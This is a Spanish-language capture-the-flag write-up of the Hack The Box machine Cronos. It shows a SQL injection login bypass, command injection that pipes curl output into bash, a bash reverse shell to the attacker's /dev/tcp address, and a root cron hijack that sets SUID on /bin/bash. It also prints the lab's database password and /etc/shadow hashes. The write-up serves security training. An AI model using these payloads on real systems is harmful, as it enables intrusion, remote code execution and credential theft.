---
layout: single
title: Cronos - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina Cronos de la plataforma de Hackthebox donde tendremos que hacer un DNS Domain Zone Transfer para poder saber nuevos subdominios de la maquina una vez sabiendo en un subdomino podremos aplicar una SQL injection basica para poder aplicar un bypass a un panel de login una vez logueados hay una parte de la maquina la cual podemos ejecutar comandos abusaremos de eso para enviarnos una reverse shell para la escalada de privilegios abusaremos de una tarea cron"
date: 2023-06-25
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-cronos/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Bash Scripting
  - Domain Zone Transfer
  - SQL Injection
  - Abusing Cron Job
  - Command Injection
---

<p align="center">
<img src="/assets/images/htb-writeup-cronos/banner.png">
</p>

⮕ Maquina Linux

```bash
❯ ping -c 1 10.10.10.13
PING 10.10.10.13 (10.10.10.13) 56(84) bytes of data.
64 bytes from 10.10.10.13: icmp_seq=1 ttl=63 time=92.0 ms

--- 10.10.10.13 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 91.957/91.957/91.957/0.000 ms
❯ whichSystem.py 10.10.10.13

10.10.10.13 (ttl -> 63): Linux
```

## PortScan 

En esta ocasión vamos a usar una pequeña herramienta que cree para automatizar el escaneo de **Nmap** 

<a href='https://github.com/MikeRega7/nrunscan' color="yellow">nrunscan</a> 

```bash
❯ ./nrunscan.sh -i
 Give me the IP target: 10.10.10.13

Starting the scan with nmap
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 13:48 CST
Initiating SYN Stealth Scan at 13:48
Scanning 10.10.10.13 [65535 ports]
Discovered open port 22/tcp on 10.10.10.13
Discovered open port 53/tcp on 10.10.10.13
Discovered open port 80/tcp on 10.10.10.13
Completed SYN Stealth Scan at 13:48, 19.07s elapsed (65535 total ports)
Nmap scan report for 10.10.10.13
Host is up, received user-set (0.095s latency).
Scanned at 2023-06-25 13:48:02 CST for 19s
Not shown: 62132 closed tcp ports (reset), 3400 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.20 seconds
           Raw packets sent: 94395 (4.153MB) | Rcvd: 75149 (3.006MB)

[*] Extracting information...

	[*] IP Target: 10.10.10.13
	[*] Open Ports:  22,53,80

[*] Ports copied to clipboard


Escaning the services and technologies in the ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 13:48 CST
Nmap scan report for 10.10.10.13
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18b973826f26c7788f1b3988d802cee8 (RSA)
|   256 1ae606a6050bbb4192b028bf7fe5963b (ECDSA)
|_  256 1a0ee7ba00cc020104cda3a93f5e2220 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.28 seconds
[*] Port 80 or 8080 is open

 Do you want to run the http-enum script of nmap (Y/N)?: N

Thanks for using the script! Happy Hacking
```

## Enumeracion 

Estas son las tecnologías que están corriendo en el puerto **80**

```ruby
❯ whatweb http://10.10.10.13
http://10.10.10.13 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.13], Title[Apache2 Ubuntu Default Page: It works]
```

Vemos la pagina por defecto de **Apache2**

![](/assets/images/htb-writeup-cronos/web1.png)

Vamos aplicar **Fuzzing** para descubrir nuevas rutas

```bash
❯ gobuster dir -u http://10.10.10.13 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 80
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.13
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/06/25 13:53:16 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 299]
                                               
===============================================================
2023/06/25 13:58:48 Finished
===============================================================
```

Como tal no tenemos capacidad de lectura en esa ruta ya que el código de estado es **403**

```bash
❯ curl -s http://10.10.10.13/server-status
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /server-status
on this server.<br />
</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.13 Port 80</address>
</body></html>
```

Otra cosa que podemos hacer es básicamente hacer **Fuzzing** pero ahora para ver si encontramos algún subdominio 

```bash
❯ gobuster vhost -u http://10.10.10.13/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://10.10.10.13/
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/06/25 14:01:02 Starting gobuster in VHOST enumeration mode
===============================================================
                              
===============================================================
2023/06/25 14:01:17 Finished
===============================================================
```

Como no encontramos nada podemos seguir enumerando el siguiente puerto que es el **53**

# Domain Zone transfer 

Para hacer esto primero necesitamos saber el **dominio** podemos usar la herramienta **nslookup** para saberlo y vemos que si funciona con esto podemos saber que también **cronos.htb** funciona 

![](/assets/images/htb-writeup-cronos/web2.png)

```bash
❯ nslookup
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
;; communications error to 10.10.10.13#53: timed out
13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.
> 
```

Vamos agregarlo al **/etc/hosts**

```bash
❯ echo "10.10.10.13 ns1.cronos.htb" | sudo tee -a /etc/hosts
10.10.10.13 ns1.cronos.htb
❯ ping -c 1 ns1.cronos.htb
PING ns1.cronos.htb (10.10.10.13) 56(84) bytes of data.
64 bytes from ns1.cronos.htb (10.10.10.13): icmp_seq=1 ttl=63 time=117 ms

--- ns1.cronos.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 117.055/117.055/117.055/0.000 ms
```

El **Domain Zone Transfer** nos permite obtener múltiples subdominios asociados al dominio para poder seguir enumerando <a href='https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns' color="yellow">Pentesting DNS</a>

Usaremos la siguiente herramienta para poder hacerlo

```bash
❯ dig -h
Usage:  dig [@global-server] [domain] [q-type] [q-class] {q-opt}
            {global-d-opt} host [@local-server] {local-d-opt}
            [ host [@local-server] {local-d-opt} [...]]
Where:  domain	 is in the Domain Name System
        q-class  is one of (in,hs,ch,...) [default: in]
        q-type   is one of (a,any,mx,ns,soa,hinfo,axfr,txt,...) [default:a]
                 (Use ixfr=version for type ixfr)
        q-opt    is one of:
                 -4                  (use IPv4 query transport only)
                 -6                  (use IPv6 query transport only)
                 -b address[#port]   (bind to source address/port)
                 -c class            (specify query class)
                 -f filename         (batch mode)
                 -k keyfile          (specify tsig key file)
                 -m                  (enable memory usage debugging)
                 -p port             (specify port number)
                 -q name             (specify query name)
                 -r                  (do not read ~/.digrc)
                 -t type             (specify query type)
                 -u                  (display times in usec instead of msec)
                 -x dot-notation     (shortcut for reverse lookups)
                 -y [hmac:]name:key  (specify named base64 tsig key)
        d-opt    is of the form +keyword[=value], where keyword is:
                 +[no]aaflag         (Set AA flag in query (+[no]aaflag))
                 +[no]aaonly         (Set AA flag in query (+[no]aaflag))
                 +[no]additional     (Control display of additional section)
                 +[no]adflag         (Set AD flag in query (default on))
                 +[no]all            (Set or clear all display flags)
                 +[no]answer         (Control display of answer section)
                 +[no]authority      (Control display of authority section)
                 +[no]badcookie      (Retry BADCOOKIE responses)
                 +[no]besteffort     (Try to parse even illegal messages)
                 +bufsize[=###]      (Set EDNS0 Max UDP packet size)
                 +[no]cdflag         (Set checking disabled flag in query)
                 +[no]class          (Control display of class in records)
                 +[no]cmd            (Control display of command line -
                                      global option)
                 +[no]comments       (Control display of packet header
                                      and section name comments)
                 +[no]cookie         (Add a COOKIE option to the request)
                 +[no]crypto         (Control display of cryptographic
                                      fields in records)
                 +[no]defname        (Use search list (+[no]search))
                 +[no]dns64prefix    (Get the DNS64 prefixes from ipv4only.arpa)
                 +[no]dnssec         (Request DNSSEC records)
                 +domain=###         (Set default domainname)
                 +[no]edns[=###]     (Set EDNS version) [0]
                 +ednsflags=###      (Set EDNS flag bits)
                 +[no]ednsnegotiation (Set EDNS version negotiation)
                 +ednsopt=###[:value] (Send specified EDNS option)
                 +noednsopt          (Clear list of +ednsopt options)
                 +[no]expandaaaa     (Expand AAAA records)
                 +[no]expire         (Request time to expire)
                 +[no]fail           (Don't try next server on SERVFAIL)
                 +[no]header-only    (Send query without a question section)
                 +[no]https[=###]    (DNS-over-HTTPS mode) [/]
                 +[no]https-get      (Use GET instead of default POST method while using HTTPS)
                 +[no]http-plain[=###]    (DNS over plain HTTP mode) [/]
                 +[no]https-plain-get      (Use GET instead of default POST method while using plain HTTP)
                 +[no]identify       (ID responders in short answers)
                 +[no]idnin          (Parse IDN names [default=on on tty])
                 +[no]idnout         (Convert IDN response [default=on on tty])
                 +[no]ignore         (Don't revert to TCP for TC responses.)
                 +[no]keepalive      (Request EDNS TCP keepalive)
                 +[no]keepopen       (Keep the TCP socket open between queries)
                 +[no]multiline      (Print records in an expanded format)
                 +ndots=###          (Set search NDOTS value)
                 +[no]nsid           (Request Name Server ID)
                 +[no]nssearch       (Search all authoritative nameservers)
                 +[no]onesoa         (AXFR prints only one soa record)
                 +[no]opcode=###     (Set the opcode of the request)
                 +padding=###        (Set padding block size [0])
                 +qid=###            (Specify the query ID to use when sending queries)
                 +[no]qr             (Print question before sending)
                 +[no]question       (Control display of question section)
                 +[no]raflag         (Set RA flag in query (+[no]raflag))
                 +[no]rdflag         (Recursive mode (+[no]recurse))
                 +[no]recurse        (Recursive mode (+[no]rdflag))
                 +retry=###          (Set number of UDP retries) [2]
                 +[no]rrcomments     (Control display of per-record comments)
                 +[no]search         (Set whether to use searchlist)
                 +[no]short          (Display nothing except short
                                      form of answers - global option)
                 +[no]showbadcookie  (Show BADCOOKIE message)
                 +[no]showsearch     (Search with intermediate results)
                 +[no]split=##       (Split hex/base64 fields into chunks)
                 +[no]stats          (Control display of statistics)
                 +subnet=addr        (Set edns-client-subnet option)
                 +[no]tcflag         (Set TC flag in query (+[no]tcflag))
                 +[no]tcp            (TCP mode (+[no]vc))
                 +timeout=###        (Set query timeout) [5]
                 +[no]tls            (DNS-over-TLS mode)
                 +[no]tls-ca[=file]  (Enable remote server's TLS certificate validation)
                 +[no]tls-hostname=hostname (Explicitly set the expected TLS hostname)
                 +[no]tls-certfile=file (Load client TLS certificate chain from file)
                 +[no]tls-keyfile=file (Load client TLS private key from file)
                 +[no]trace          (Trace delegation down from root [+dnssec])
                 +tries=###          (Set number of UDP attempts) [3]
                 +[no]ttlid          (Control display of ttls in records)
                 +[no]ttlunits       (Display TTLs in human-readable units)
                 +[no]unknownformat  (Print RDATA in RFC 3597 "unknown" format)
                 +[no]vc             (TCP mode (+[no]tcp))
                 +[no]yaml           (Present the results as YAML)
                 +[no]zflag          (Set Z flag in query)
        global d-opts and servers (before host name) affect all queries.
        local d-opts and servers (after host name) affect only that lookup.
        -h                           (print help and exit)
        -v                           (print version and exit)
```

Vemos estos subdominios nuevos

```bash
❯ dig @10.10.10.13 cronos.htb axfr

; <<>> DiG 9.18.12-1~bpo11+1-Debian <<>> @10.10.10.13 cronos.htb axfr
; (1 server found)
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13
admin.cronos.htb.	604800	IN	A	10.10.10.13
ns1.cronos.htb.		604800	IN	A	10.10.10.13
www.cronos.htb.		604800	IN	A	10.10.10.13
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 96 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Sun Jun 25 14:17:12 CST 2023
;; XFR size: 7 records (messages 1, bytes 203)
```

Vamos agregar los nuevos subdominios al **/etc/hosts** 

```bash
❯ cat /etc/hosts | tail -n 1
10.10.10.13 ns1.cronos.htb cronos.htb admin.cronos.htb www.cronos.htb
❯ ping -c 1 admin.cronos.htb
PING ns1.cronos.htb (10.10.10.13) 56(84) bytes of data.
64 bytes from ns1.cronos.htb (10.10.10.13): icmp_seq=1 ttl=63 time=94.0 ms

--- ns1.cronos.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 94.038/94.038/94.038/0.000 ms
❯ ping -c 1 www.cronos.htb
PING ns1.cronos.htb (10.10.10.13) 56(84) bytes of data.
64 bytes from ns1.cronos.htb (10.10.10.13): icmp_seq=1 ttl=63 time=94.6 ms

--- ns1.cronos.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 94.566/94.566/94.566/0.000 ms
```

Ahora teniendo los subdominios podemos seguir enumerando 

## Subdomains Enumeration

Vemos un panel de **Login** en el subdominio **admin.cronos.htb**

![](/assets/images/htb-writeup-cronos/web3.png)

Y en el subdominio `www.cronos.htb` vemos esto lo cual no es interesante

![](/assets/images/htb-writeup-cronos/web4.png)

Vamos aplicar **Fuzzing** para ver si encontramos algo en el subdominio **admin.cronos.htb** pero nada interesante

```bash
❯ feroxbuster -u http://admin.cronos.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://admin.cronos.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
403       11l       32w      304c http://admin.cronos.htb/server-status
[####################] - 1m     29999/29999   0s      found:1       errors:0      
[####################] - 1m     29999/29999   377/s   http://admin.cronos.htb
```

Por ultimo vamos a aplicar lo mismo pero para el otro subdominio si no encontramos nada vamos a tener que interactuar con el panel de login 

```bash
❯ feroxbuster -u http://www.cronos.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://www.cronos.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      314c http://www.cronos.htb/css
301        9l       28w      313c http://www.cronos.htb/js
403       11l       32w      302c http://www.cronos.htb/server-status
[####################] - 1m     89997/89997   0s      found:3       errors:1      
[####################] - 1m     29999/29999   409/s   http://www.cronos.htb
[####################] - 1m     29999/29999   414/s   http://www.cronos.htb/css
[####################] - 1m     29999/29999   416/s   http://www.cronos.htb/js
```

## SQLI Bypass Login 

Pues bueno no encontramos nada así que vamos a tener que seguir con el panel de login que vimos en el subdominio **admin.cronos.htb**

Si probamos con **admin:admin** vemos que no nos deja 

![](/assets/images/htb-writeup-cronos/web5.png)

Si probamos con un **' or 1=1-- -** y le damos a **submit** vemos que nos deja conectarnos

![](/assets/images/htb-writeup-cronos/web6.png)

![](/assets/images/htb-writeup-cronos/web7.png)

Bueno ahora vemos que podemos hacer un **traceroute** o un **ping** a una **IP** lo que podemos hacer es ponernos en escucha con **tcpdump** para ver si nos llega alguna traza

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Vemos que se hizo 

![](/assets/images/htb-writeup-cronos/web8.png)

Y nos llega 

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:25:53.511249 IP 10.10.10.13 > 10.10.14.12: ICMP echo request, id 2859, seq 1, length 64
15:25:53.511313 IP 10.10.14.12 > 10.10.10.13: ICMP echo reply, id 2859, seq 1, length 64
```

Si esto no esta bien sanitizado podemos concatenar un comando para ver si se puede ejecutar

![](/assets/images/htb-writeup-cronos/web9.png)

## Shell as www-data

Como podemos ejecutar comandos vamos a ver si la maquina tiene **curl** para ver si de esta forma podemos ganar acceso ala maquina

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![](/assets/images/htb-writeup-cronos/web10.png)

Como podemos ejecutar **curl** podemos hacer que haga una petición a un recurso que vamos a estar ofreciendo mediante nuestro servidor **http** con **Python3** y nos llegue la **shell**

```bash
❯ catn index.html
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.12/443 0>&1
```

Ahora nos podemos en escucha por el puerto **443** o el que tu quieras

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Y podemos el servidor 

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Ahora ejecutamos esto `10.10.14.12; curl 10.10.14.12 | bash` en la parte del input y al darle a **execute** nos llega la **reverse shell**

![](/assets/images/htb-writeup-cronos/web11.png)

![](/assets/images/htb-writeup-cronos/web12.png)

Ahora haremos un tratamiento de la **tty**

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.13] 55354
bash: cannot set terminal process group (1316): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@cronos:/var/www/admin$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
www-data@cronos:/var/www/admin$ export TERM=xterm
```

## User.txt 

Podemos ver la **flag** 

```bash
www-data@cronos:/home$ cd noulis/
www-data@cronos:/home/noulis$ ls
user.txt
www-data@cronos:/home/noulis$ cat user.txt 
61a7c302aadebca30bea49c3fa34b259
www-data@cronos:/home/noulis$ 
```

## Escalada de privilegios 

# mysql connect

En esta ruta vemos las credenciales de la base de datos

```bash
www-data@cronos:/home/noulis$ cd /var/www/admin/
www-data@cronos:/var/www/admin$ ls
config.php  index.php  logout.php  session.php	welcome.php
www-data@cronos:/var/www/admin$ cat config.php 
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
www-data@cronos:/var/www/admin$ 
```

Vemos que nos podemos conectar ala base de datos **admin**

```bash
www-data@cronos:/var/www/admin$ mysql -u admin -pkEjdbRigfBHUREiNSDs admin
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 36
Server version: 5.7.17-0ubuntu0.16.04.2 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

Hay una tabla **users**

```bash
mysql> show tables;
+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> 
```

Vemos la contraseña del **admin** pero ahora no nos sirve de nada por que al parecer estas credenciales son para loguearnos en el panel de login 

```bash
mysql> select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)

mysql> 
```

Si buscamos por privilegios **SUID** encontramos los siguientes pero no usaremos el **pkexec**

```bash
www-data@cronos:/$ find \-perm -4000 2>/dev/null
./bin/ping
./bin/umount
./bin/mount
./bin/fusermount
./bin/su
./bin/ntfs-3g
./bin/ping6
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/snapd/snap-confine
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/bin/chsh
./usr/bin/newuidmap
./usr/bin/sudo
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/at
./usr/bin/pkexec
./usr/bin/newgidmap
./usr/bin/gpasswd
./usr/bin/passwd
www-data@cronos:/$ 

```

Como tal no podemos reutilizar al contraseña que encontramos en la base de datos

```bash
www-data@cronos:/home$ sudo -l
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
sudo: 1 incorrect password attempt
www-data@cronos:/home$ ls
noulis
www-data@cronos:/home$ su noulis
Password: 
su: Authentication failure
www-data@cronos:/home$ 
```

Vemos que cada minuto **root** esta ejecutando con **php** lo que hay en esa ruta 

```bash
www-data@cronos:/opt$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
#
www-data@cronos:/opt$  
```

Y bueno somos propietarios de ese archivo

```bash
www-data@cronos:/var/www/admin$ ls -l /var/www/laravel/artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
www-data@cronos:/var/www/admin$ 
```

Vamos a meter lo que queramos en **PHP** 

Podemos crearnos también un **Script** en **bash** para detectar las tareas que se estén ejecutando

```bash
www-data@cronos:/dev/shm$ chmod +x procmon.sh 
www-data@cronos:/dev/shm$ cat procmon.sh 
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!]Saliendo....\n"
	tput cnorm; exit 1
}

# CTRL+C
trap ctrl_c INT

old_process="$(ps -eo command)"

tput civis
while true; do
	new_process="$(ps -eo command)"
	diff <(echo "$old_process") <(echo "$new_process") | grep -vE "command|procmon|kworker"
	old_process="$new_process"
done
tput cnorm
www-data@cronos:/dev/shm$ 
```

Si lo ejecutamos vemos lo que nos interesa 

```bash
www-data@cronos:/dev/shm$ ./procmon.sh
> /usr/sbin/CRON -f
> /bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
> php /var/www/laravel/artisan schedule:run
172,174d171
< /usr/sbin/CRON -f
< /bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
< php /var/www/laravel/artisan schedule:run
```

Igual si no quieres hacer esto puedes usar <a href='https://github.com/DominicBreuker/pspy' color="yellow">pspy</a> 

Vamos abrirnos el archivo para indicarle la instrucción que queremos que ejecute en **PHP** que lo que queremos es que nos asigne el privilegio **SUID** ala **bash**

```bash
www-data@cronos:/dev/shm$ cat /var/www/laravel/artisan 
#!/usr/bin/env php
<?php
system("chmod u+s /bin/bash");
/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader
| for our application. We just need to utilize it! We'll require it
| into the script here so that we do not have to worry about the
| loading of any our classes "manually". Feels great to relax.
|
*/

require __DIR__.'/bootstrap/autoload.php';

$app = require_once __DIR__.'/bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Artisan Application
|--------------------------------------------------------------------------
|
| When we run the console application, the current CLI command will be
| executed in this console and the response sent back to a terminal
| or another output device for the developers. Here goes nothing!
|
*/

$kernel = $app->make(Illuminate\Contracts\Console\Kernel::class);

$status = $kernel->handle(
    $input = new Symfony\Component\Console\Input\ArgvInput,
    new Symfony\Component\Console\Output\ConsoleOutput
);

/*
|--------------------------------------------------------------------------
| Shutdown The Application
|--------------------------------------------------------------------------
|
| Once Artisan has finished running. We will fire off the shutdown events
| so that any final work may be done by the application before we shut
| down the process. This is the last thing to happen to the request.
|
*/

$kernel->terminate($input, $status);

exit($status);
www-data@cronos:/dev/shm$ 
```

Después de que la tarea se ejecuta vemos que funciona

```bash
www-data@cronos:/dev/shm$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
www-data@cronos:/dev/shm$
```

## Shell as root && root flag 

Y ahora somos **root**

```bash
www-data@cronos:/dev/shm$ bash -p
bash-4.3# cd /root
bash-4.3# cat root.txt 
b5cc776e1d79fdac052bf9587cb66462
bash-4.3# 
```

Estos son los hashes de los usuarios si logras crackearlos podrás ver sus contraseñas en texto claro

```bash
bash-4.3# cat /etc/shadow
root:$6$L2m6DJwN$p/xas4tCNp19sda4q2ZzGC82Ix7GiEb7xvCbzWCsFHs/eR82G4/YOnni/.L69tpCkOGo5lm0AU7zh9lP5fL6A0:17247:0:99999:7:::
daemon:*:17212:0:99999:7:::
bin:*:17212:0:99999:7:::
sys:*:17212:0:99999:7:::
sync:*:17212:0:99999:7:::
games:*:17212:0:99999:7:::
man:*:17212:0:99999:7:::
lp:*:17212:0:99999:7:::
mail:*:17212:0:99999:7:::
news:*:17212:0:99999:7:::
uucp:*:17212:0:99999:7:::
proxy:*:17212:0:99999:7:::
www-data:$6$SYixzIan$P3cvyztSwA1lmILF3kpKcqZpYSDONYwMwplB62RWu1RklKqIGCX1zleXuVwzxjLcpU6bhiW9N03AWkzVUZhms.:17264:0:99999:7:::
backup:*:17212:0:99999:7:::
list:*:17212:0:99999:7:::
irc:*:17212:0:99999:7:::
gnats:*:17212:0:99999:7:::
nobody:*:17212:0:99999:7:::
systemd-timesync:*:17212:0:99999:7:::
systemd-network:*:17212:0:99999:7:::
systemd-resolve:*:17212:0:99999:7:::
systemd-bus-proxy:*:17212:0:99999:7:::
syslog:*:17212:0:99999:7:::
_apt:*:17212:0:99999:7:::
lxd:*:17247:0:99999:7:::
mysql:!:17247:0:99999:7:::
messagebus:*:17247:0:99999:7:::
uuidd:*:17247:0:99999:7:::
dnsmasq:*:17247:0:99999:7:::
sshd:*:17247:0:99999:7:::
noulis:$6$ApsLg5.I$Zd9blHPGRHAQOab94HKuQFtJ8m7ob8MFnX6WIIr0Aah6pW/aZ.yA3T1iU13lCSixrh6NG1.GHPl.QbjHSZmg7/:17247:0:99999:7:::
bind:*:17264:0:99999:7:::
bash-4.3# 
```
